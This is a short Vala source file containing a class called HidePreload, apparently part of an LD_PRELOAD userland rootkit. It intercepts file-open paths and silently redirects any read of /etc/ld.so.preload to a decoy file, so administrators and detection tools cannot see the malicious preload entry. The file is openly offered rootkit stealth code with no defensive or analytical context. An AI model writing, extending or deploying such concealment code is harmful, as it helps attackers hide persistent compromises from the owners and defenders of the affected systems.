using Posix;

// stealth class used to hide /etc/ld.so.preload
// and fake any responses
// TODO: 
[Compact]
class HidePreload
{
	public static string TamperOpenPath(string file)
	{
		string realFile = realpath(file);

		if(Strings.equal(realFile, "/etc/ld.so.preload"))
		{
			return "/etc/.fake.ld.so.preload";
		}

		return file;
	}
}
